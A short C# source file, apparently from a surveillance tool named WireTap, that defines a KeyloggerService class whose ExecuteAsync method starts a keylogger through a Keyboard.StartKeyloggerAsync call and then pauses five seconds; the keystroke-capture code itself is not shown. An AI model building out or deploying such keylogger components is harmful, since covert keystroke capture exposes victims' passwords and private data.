namespace WireTap.Service
{
    using System;
    using System.Threading.Tasks;

    internal class KeyloggerService : ServiceBase, IService
    {
        internal override async Task ExecuteAsync()
        {
            Console.WriteLine("Inside KeyloggerService.ExecuteAsync");
            await Keyboard.StartKeyloggerAsync();
            await Task.Delay(5000);
        }
    }
}